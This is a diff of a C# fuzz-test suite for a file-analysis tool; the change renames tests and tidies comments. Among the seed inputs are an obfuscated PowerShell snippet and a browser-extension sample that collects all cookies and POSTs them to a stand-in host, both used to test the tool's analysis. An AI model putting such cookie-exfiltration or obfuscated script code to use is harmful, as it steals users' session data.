@@ -6,10 +6,7 @@ using Corvus.Tests.NativeFormats;
 
 namespace Corvus.Tests;
 
-/// <summary>
-/// summarize_file views on damaged files, each asked for by name: a view answers, returns null or throws a tool error.
-/// The views with a fuzz entry of their own (pcap, SQLite, firmware, Flutter, nib, Rust) are left to it.
-/// </summary>
+/// <summary>summarize_file views on damaged files answer, return null or throw a tool error.</summary>
 public sealed class FileViewFuzzTests : IDisposable
 {
     private readonly TempDir _dir = new();
@@ -18,13 +15,14 @@ public sealed class FileViewFuzzTests : IDisposable
 
     private void Fuzz(IFileSummaryView view, string name, int iterations, params byte[][] seeds)
     {
-        // a folder of its own: views that look beside the file (Wasm glue, bundle folders) find nothing there
+        // A folder of its own: views that look beside the file (Wasm glue, bundle folders) find nothing there.
         var path = Path.Combine(Directory.CreateDirectory(_dir.File(view.Name)).FullName, name);
         var failures = new List<string>();
         foreach (var seed in seeds)
             failures.AddRange(FormatFuzz.Run(seed, b =>
             {
-                File.WriteAllBytes(path, b); // some views read the file again from its path
+                // Some views read the file again from its path.
+                File.WriteAllBytes(path, b);
                 try { view.Inspect(new FileInput(path, b, Blob.Identify(b)) { Options = new FileViewOptions(view.Name) }, default); }
                 catch (ToolError) { }
             }, iterations));
@@ -33,11 +31,11 @@ public sealed class FileViewFuzzTests : IDisposable
 
     [Fact]
     [FuzzEntry(typeof(AndroidFileView))]
-    public void Android() => Fuzz(new AndroidFileView(), "app.apk", 300, AndroidSamples.Apk());
+    public void Fuzzed_Android_packages_never_throw_past_a_tool_error() => Fuzz(new AndroidFileView(), "app.apk", 300, AndroidSamples.Apk());
 
     [Fact]
     [FuzzEntry(typeof(AppleFileView))]
-    public void Apple()
+    public void Fuzzed_iOS_packages_never_throw_past_a_tool_error()
     {
         var plist = Encoding.UTF8.GetBytes("<?xml version=\"1.0\"?><plist version=\"1.0\"><dict><key>CFBundleIdentifier</key><string>com.example.zoo</string>" +
             "<key>CFBundleExecutable</key><string>Zoo</string><key>CFBundleShortVersionString</key><string>1.2</string></dict></plist>");
@@ -47,7 +45,7 @@ public sealed class FileViewFuzzTests : IDisposable
 
     [Fact]
     [FuzzEntry(typeof(ElectronFileView))]
-    public void Electron()
+    public void Fuzzed_asar_archives_and_executables_never_throw_past_a_tool_error()
     {
         var (asar, _) = AsarWriter.Build([AsarWriter.Text("package.json", """{"name":"demo","main":"main.js"}"""), AsarWriter.Text("main.js", "new BrowserWindow({ webPreferences: { nodeIntegration: true } })")]);
         Fuzz(new ElectronFileView(), "app.asar", 300, asar);
@@ -56,7 +54,7 @@ public sealed class FileViewFuzzTests : IDisposable
 
     [Fact]
     [FuzzEntry(typeof(GoFileView))]
-    public void Go()
+    public void Fuzzed_Go_binaries_never_throw_past_a_tool_error()
     {
         var elf = new ElfWriter
         {
@@ -68,11 +66,11 @@ public sealed class FileViewFuzzTests : IDisposable
 
     [Fact]
     [FuzzEntry(typeof(NativeFileView))]
-    public void Native() => Fuzz(new NativeFileView(), "lib.bin", 300, NativePeTests.KitchenSink(true), FormatWriterTests.SampleElf().Build(), FormatWriterTests.SampleMachO().Build());
+    public void Fuzzed_native_images_never_throw_past_a_tool_error() => Fuzz(new NativeFileView(), "lib.bin", 300, NativePeTests.KitchenSink(true), FormatWriterTests.SampleElf().Build(), FormatWriterTests.SampleMachO().Build());
 
     [Fact]
     [FuzzEntry(typeof(RawCodeFileView))]
-    public void Raw()
+    public void Fuzzed_raw_code_never_throws_past_a_tool_error()
     {
         // 8 KiB of arm64 frames (stp x29, x30; mov x29, sp; ret) with a string after each, so the view finds code and a base.
         var code = new List<byte>();
@@ -86,28 +84,28 @@ public sealed class FileViewFuzzTests : IDisposable
 
     [Fact]
     [FuzzEntry(typeof(PlistFileView))]
-    public void Plist() => Fuzz(new PlistFileView(), "Info.plist", 500,
+    public void Fuzzed_plists_never_throw_past_a_tool_error() => Fuzz(new PlistFileView(), "Info.plist", 500,
         Encoding.UTF8.GetBytes("<?xml version=\"1.0\"?><plist><dict><key>a</key><array><integer>1</integer><data>AAEC</data></array></dict></plist>"));
 
     [Fact]
     [FuzzEntry(typeof(ProtobufFileView))]
-    public void Protobuf() => Fuzz(new ProtobufFileView(), "demo.pb", 500, ProtoWriter.Demo());
+    public void Fuzzed_protobuf_descriptors_never_throw_past_a_tool_error() => Fuzz(new ProtobufFileView(), "demo.pb", 500, ProtoWriter.Demo());
 
     [Fact]
     [FuzzEntry(typeof(PageFileView), typeof(Services.Web.SavedPage))]
-    public void Page() => Fuzz(new PageFileView(), "page.html", 300,
+    public void Fuzzed_saved_pages_never_throw_past_a_tool_error() => Fuzz(new PageFileView(), "page.html", 300,
         Encoding.UTF8.GetBytes("<!doctype html><!-- saved from url=(0024)https://a.example.com/ --><meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'nonce-a' 'sha256-x'\">" +
             "<script nonce=a>go()</script><script src=\"data:text/javascript;base64,Z28oKQ==\" integrity=\"sha256-x sha384-y\"></script>" +
             "<script type=importmap>{\"imports\":{\"a\":\"https://b.example.net/a.js\"},\"scopes\":{\"/s/\":{\"a\":\"./a.js\"}}}</script>"));
 
     [Fact]
     [FuzzEntry(typeof(ScriptFileView))]
-    public void Script() => Fuzz(new ScriptFileView(), "drop.ps1", 120,
+    public void Fuzzed_scripts_never_throw_past_a_tool_error() => Fuzz(new ScriptFileView(), "drop.ps1", 120,
         Encoding.UTF8.GetBytes("& ( $PSHomE[4]+$pShome[34]+'x') (('1wb'+'u = 7Xkhttp://'+'ex'+'ample.com/cor'+'vus7Xk').REPLAce(([ChAR]49+[ChAR]119+[ChAR]98),'$').REPLAce('7Xk',[String][ChAR]39))"));
 
     [Fact]
     [FuzzEntry(typeof(PackageFileView), typeof(Corvus.Services.Web.Packages.CrxHeader))]
-    public void Package()
+    public void Fuzzed_browser_and_editor_extensions_never_throw_past_a_tool_error()
     {
         var zip = ContainerFixtures.Zip(("manifest.json", Encoding.UTF8.GetBytes("""{"manifest_version":3,"name":"x","version":"1","permissions":["cookies"],"host_permissions":["<all_urls>"],"background":{"service_worker":"b.js"}}""")),
             ("b.js", Encoding.UTF8.GetBytes("chrome.cookies.getAll({}, c => fetch('https://a.example/c', {method:'POST'}));")));
@@ -118,10 +116,10 @@ public sealed class FileViewFuzzTests : IDisposable
 
     [Fact]
     [FuzzEntry(typeof(SqliteRecoverFileView))]
-    public void SqliteRecover() => Fuzz(new SqliteRecoverFileView(), "msg.db", 300,
+    public void Fuzzed_databases_with_deleted_rows_never_throw_past_a_tool_error() => Fuzz(new SqliteRecoverFileView(), "msg.db", 300,
         NativeSqlite.Build("CREATE TABLE msg(id INTEGER PRIMARY KEY, body TEXT);", "INSERT INTO msg(body) VALUES ('one'), ('two'), ('three');", "DELETE FROM msg WHERE id = 2;"));
 
     [Fact]
     [FuzzEntry(typeof(WasmFileView))]
-    public void Wasm() => Fuzz(new WasmFileView(), "app.wasm", 500, WasmTests.Sample());
+    public void Fuzzed_Wasm_modules_never_throw_past_a_tool_error() => Fuzz(new WasmFileView(), "app.wasm", 500, WasmTests.Sample());
 }
